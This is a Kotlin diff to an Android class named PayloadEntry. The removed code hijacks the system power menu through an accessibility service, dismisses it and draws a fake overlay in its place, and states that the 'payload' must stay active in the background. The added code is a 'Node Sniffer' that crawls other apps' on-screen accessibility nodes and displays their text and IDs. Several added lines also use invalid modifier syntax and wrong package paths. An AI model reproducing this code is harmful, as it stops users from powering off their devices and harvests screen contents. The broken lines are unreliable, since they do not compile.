@@ -22,222 +22,128 @@ import androidx.compose.ui.unit.dp
 import android.view.accessibility.AccessibilityEvent
 
 class PayloadEntry : DynamicEntry {
-    enum class SetupStep { HOME, OVERLAY, ACCESSIBILITY, READY }
+    private val liveNodes = mutableStateListOf<String>()
 
     @Composable
     override fun Render(context: Context, resDir: File) {
-        val engine = remember { LauncherEngine(context) }
-        var apps by remember { mutableStateOf<List<AppModel>>(emptyList()) }
-        var currentStep by remember { mutableStateOf(SetupStep.HOME) }
-        var showPowerMenu by remember { mutableStateOf(false) }
-        var showLogs by remember { mutableStateOf(false) }
-        val lifecycleOwner = LocalLifecycleOwner.current
-
-        fun updateStep() {
-            try {
-                DynamicEntry.log("⚙️ Checking Perms -> Home: ${engine.isHomeApp()} | Overlay: ${engine.hasOverlayPermission()} | Acc: ${engine.isAccessibilityEnabled()}")
-            } catch (e: Exception) {
-                DynamicEntry.log("💥 Perm check error: ${e.message}")
-            }
-            currentStep = when {
-                !engine.hasOverlayPermission() -> SetupStep.OVERLAY
-                !engine.isAccessibilityEnabled() -> SetupStep.ACCESSIBILITY
-                else -> SetupStep.READY
-            }
-        }
-
-        var lastPowerDown by remember { mutableLongStateOf(0L) }
-
-        LaunchedEffect(Unit) {
-            try {
-                DynamicEntry.log("🔥 PAYLOAD BOOT SEQUENCE INITIATED")
-                DynamicEntry.log("📱 DEVICE: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} (API ${android.os.Build.VERSION.SDK_INT})")
-            } catch (e: Throwable) {
-                DynamicEntry.log("💥 BOOT ERROR: ${e.stackTraceToString()}")
-            }
-            
-            updateStep()
-            
-            var accEventCount = 0L
-            DynamicEntry.accessibilityInterceptor = { event ->
-                try {
-                    accEventCount++
-                    val type = event.eventType
-                    val pkg = event.packageName?.toString()?.lowercase() ?: ""
-                    val cls = event.className?.toString()?.lowercase() ?: ""
-                    
-                    if (accEventCount % 50L == 0L) {
-                        DynamicEntry.log("💓 Acc Heartbeat: Received $accEventCount events so far. Last: $pkg")
-                    }
-
-                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                        DynamicEntry.log("🪟 WIN_STATE: pkg=$pkg | cls=$cls")
-                    }
-
-                    // For Samsung, Power menu can trigger either STATE_CHANGED or CONTENT_CHANGED
-                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                        // Target system overlays AND Samsung's GlobalActions
-                        if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice") || pkg.contains("globalactions") || pkg.contains("power")) {
-                            var isPowerMenu = false
-                            DynamicEntry.log("🔍 Scanning Target: $pkg (Event Type: $type)")
-                            
-                            if (pkg.contains("globalactions")) {
-                                isPowerMenu = true
-                                DynamicEntry.log("✅ Matched Samsung GlobalActions Package!")
-                            }
-
-                            // Method 1: Check high-level event text
-                            val eventText = event.text.joinToString(" ").lowercase()
-                            if (eventText.isNotBlank()) {
-                                DynamicEntry.log("📝 Event Text: $eventText")
-                            }
-                            if (eventText.contains("power off") || eventText.contains("emergency mode") || eventText.contains("lockdown mode")) {
-                                isPowerMenu = true
-                                DynamicEntry.log("✅ Matched Event Text: $eventText")
-                            }
-
-                            // Method 2: Deep scan the accessibility nodes (More accurate for Samsung)
-                            if (!isPowerMenu) {
-                                fun scanNodes(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int): Boolean {
-                                    if (node == null) return false
-                                    if (depth > 5) return false // Prevent unbounded recursion
-                                    
-                                    val nodeText = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
-                                    if (nodeText.isNotBlank() && depth <= 2) {
-                                        DynamicEntry.log("   ↳ Node Depth $depth: $nodeText")
-                                    }
-                                    
-                                    if (nodeText.contains("power off") || nodeText.contains("emergency mode") || nodeText.contains("side key settings")) {
-                                        DynamicEntry.log("✅ Matched UI Node: $nodeText")
-                                        return true
-                                    }
-                                    
-                                    for (i in 0 until node.childCount) {
-                                        val child = try { node.getChild(i) } catch(e: Exception) { null }
-                                        if (child != null) {
-                                            val matched = scanNodes(child, depth + 1)
-                                            child.recycle()
-                                            if (matched) return true
-                                        }
-                                    }
-                                    return false
-                                }
-                                
-                                val rootNode = try { event.source } catch(e: Exception) { null }
-                                if (rootNode != null) {
-                                    DynamicEntry.log("🔎 Deep scanning node tree...")
-                                    isPowerMenu = scanNodes(rootNode, 0)
-                                    rootNode.recycle() // Prevent memory leaks
-                                } else {
-                                    DynamicEntry.log("⚠️ event.source is NULL. Cannot deep scan.")
-                                }
-                            }
-
-                            // Method 3: Fallback to class name check
-                            if (!isPowerMenu) {
-                                if (cls.contains("globalactions", ignoreCase = true) || cls.contains("power", ignoreCase = true)) {
-                                    isPowerMenu = true
-                                    DynamicEntry.log("⚠️ Fallback Matched Class: $cls")
-                                }
-                            }
-
-                            if (isPowerMenu) {
-                                DynamicEntry.log("🚀 INTERCEPTING POWER MENU!")
-                                // ⚔️ Kill the system UI menu via global back action
-                                DynamicEntry.activeAccessibilityService?.performGlobalAction(
-                                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
-                                )
-
-                                val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                    vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
-                                } else {
-                                    @Suppress("DEPRECATION")
-                                    vib.vibrate(50)
-                                }
-                                
-                                // 🚀 Draw the custom overlay
-                                DynamicEntry.overlayContent = { 
-                                    PowerMenuOverlay(onDismiss = { 
-                                        DynamicEntry.log("Closing custom overlay.")
-                                        DynamicEntry.overlayContent = null 
-                                    }) 
-                                }
-                            } else {
-                                DynamicEntry.log("❌ Ignore: Not a power menu.")
-                            }
-                        }
-                    }
-                } catch(e: Throwable) {
-                    DynamicEntry.log("💥 ACC CRASH: ${e.message}")
-                }
-            }
-
-            DynamicEntry.keyInterceptor = { event ->
-                false // Pass keys through. KEYCODE_POWER is hard-blocked by Android OS. We rely strictly on Window State Changes.
-            }
-        }
+        var isServiceEnabled by remember { mutableStateOf(checkAccessibility(context)) }
+        val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
 
         DisposableEffect(lifecycleOwner) {
-            val observer = LifecycleEventObserver { _, event ->
-                if (event == Lifecycle.Event.ON_RESUME) updateStep()
+            val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
+                if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
+                    isServiceEnabled = checkAccessibility(context)
+                }
             }
             lifecycleOwner.lifecycle.addObserver(observer)
-            onDispose { 
-                lifecycleOwner.lifecycle.removeObserver(observer)
-                // CRITICAL FIX: Do NOT clear the interceptors here.
-                // The payload must remain active in the background even if the UI unmounts!
-            }
+            onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
         }
 
-        if (showPowerMenu) {
-            PowerMenuOverlay(onDismiss = { showPowerMenu = false })
-        } else {
-            Box(modifier = Modifier.fillMaxSize()) {
-                when (currentStep) {
-                    SetupStep.HOME -> { /* Deprecated - Bypassed for now */ }
-                    SetupStep.OVERLAY -> OnboardingStep(
-                        title = "Draw Over Apps",
-                        desc = "This allows the shell to manage system gestures and overlays.",
-                        buttonText = "Enable Overlay",
-                        onAction = { engine.openOverlaySettings() }
-                    )
-                    SetupStep.ACCESSIBILITY -> OnboardingStep(
-                        title = "Accessibility",
-                        desc = "Required for programmatic tapping and system key interception.",
-                        buttonText = "Grant Access",
-                        onAction = { engine.openAccessibilitySettings() }
-                    )
-                    SetupStep.READY -> {
-                        LaunchedEffect(Unit) {
-                            try {
-                                DynamicEntry.log("✅ Permissions OK. Loading Apps...")
-                                withContext(Dispatchers.IO) {
-                                    val loadedApps = engine.getInstalledApps()
-                                    withContext(Dispatchers.Main) { apps = loadedApps }
-                                }
-                            } catch (e: Throwable) {
-                                DynamicEntry.log("💥 APP LOAD ERROR: ${e.stackTraceToString()}")
-                            }
-                        }
-                        LauncherScreen(apps = apps, engine = engine, onAppClick = { engine.launchApp(it) })
-                        
-                        FloatingActionButton(
-                            onClick = { showLogs = true },
-                            modifier = Modifier
-                                .align(Alignment.BottomEnd)
-                                .padding(16.dp),
-                            containerColor = Color(0xFF3D5AFE)
-                        ) {
-                            Text("Logs", color = Color.White)
+        LaunchedEffect(Unit) {
+            DynamicEntry.accessibilityInterceptor = { event ->
+                val root = try { event.source } catch (e: Exception) { null }
+                if (root != null) {
+                    val snapshot = mutableListOf<String>()
+                    crawl(root, 0, snapshot)
+                    root.recycle()
+                    
+                    if (snapshot.isNotEmpty()) {
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            liveNodes.clear()
+                            liveNodes.addAll(snapshot)
                         }
                     }
                 }
-                
-                if (showLogs) {
-                    SystemLogOverlay(onDismiss = { showLogs = false })
+            }
+        }
+
+        androidx.compose.material3.Scaffold(
+            containerColor = androidx.compose.ui.graphics.Color(0xFF0F0F0F),
+            topBar = {
+                androidx.compose.material3.SmallTopAppBar(
+                    title = { androidx.compose.material3.Text("Node Sniffer", color = androidx.compose.ui.graphics.Color.White) },
+                    colors = androidx.compose.material3.TopAppBarDefaults.smallTopAppBarColors(containerColor = androidx.compose.ui.graphics.Color.Black)
+                )
+            }
+        ) { padding ->
+            androidx.compose.foundation.layout.Column(
+                modifier = androidx.compose.foundation.layout.Modifier
+                    .padding(padding)
+                    .fillMaxSize()
+            ) {
+                if (!isServiceEnabled) {
+                    PermissionBanner { 
+                        val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        context.startActivity(intent)
+                    }
+                }
+
+                androidx.compose.foundation.lazy.LazyColumn(
+                    modifier = androidx.compose.foundation.layout.Modifier.weight(1f).fillMaxWidth(),
+                    contentPadding = androidx.compose.foundation.layout.PaddingValues(16.dp)
+                ) {
+                    items(liveNodes.size) { index ->
+                        NodeItem(text = liveNodes[index])
+                    }
                 }
             }
         }
     }
+
+    private fun crawl(node: android.view.accessibility.AccessibilityNodeInfo, depth: Int, list: MutableList<String>) {
+        if (depth > 10 || list.size > 50) return
+        
+        val id = node.viewIdResourceName ?: ""
+        val txt = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
+        val cls = node.className?.toString()?.split(".")?.last() ?: "View"
+        
+        if (txt.isNotBlank() || id.isNotBlank()) {
+            val indent = "  ".repeat(depth)
+            list.add("$indent[$cls] ${if(id.isNotEmpty()) "#$id" else ""} -> \"$txt\"")
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = try { node.getChild(i) } catch (e: Exception) { null }
+            if (child != null) {
+                crawl(child, depth + 1, list)
+                child.recycle()
+            }
+        }
+    }
+
+    private fun checkAccessibility(context: Context): Boolean {
+        val expectedId = "${context.packageName}/com.speedster.SpeedsterAccessibilityService"
+        val enabledServices = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+        return enabledServices?.contains(expectedId) == true
+    }
+}
+
+@Composable
+fun PermissionBanner(onAction: () -> Unit) {
+    androidx.compose.foundation.layout.Box(
+        modifier = androidx.compose.foundation.layout.Modifier
+            .fillMaxWidth()
+            .androidx.compose.foundation.background(androidx.compose.ui.graphics.Color(0xFFE74C3C))
+            .androidx.compose.foundation.clickable { onAction() }
+            .padding(16.dp)
+    ) {
+        androidx.compose.material3.Text(
+            "Accessibility Disabled. Tap to fix.",
+            color = androidx.compose.ui.graphics.Color.White,
+            fontWeight = androidx.compose.ui.text.font.FontWeight.Bold,
+            modifier = androidx.compose.ui.layout.Modifier.align(androidx.compose.ui.graphics.Alignment.Center)
+        )
+    }
+}
+
+@Composable
+fun NodeItem(text: String) {
+    androidx.compose.material3.Text(
+        text = text,
+        color = androidx.compose.ui.graphics.Color(0xFF00FF00),
+        fontSize = 12.sp,
+        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+        modifier = androidx.compose.ui.layout.Modifier.padding(vertical = 2.dp)
+    )
 }
